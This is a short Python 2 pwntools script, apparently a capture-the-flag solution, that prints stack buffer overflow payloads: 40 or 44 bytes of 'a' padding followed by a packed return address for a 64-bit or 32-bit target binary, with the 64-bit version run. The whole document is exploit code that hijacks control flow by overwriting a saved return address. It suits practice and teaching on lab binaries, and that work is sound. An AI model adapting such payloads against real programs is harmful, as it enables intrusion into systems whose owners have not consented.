from pwn import *

def solve64():
    print 'a'*40 + p64(0x400811)

def solve32():
    print 'a'*44 + p32(0x8048659)

# solve32()
solve64()
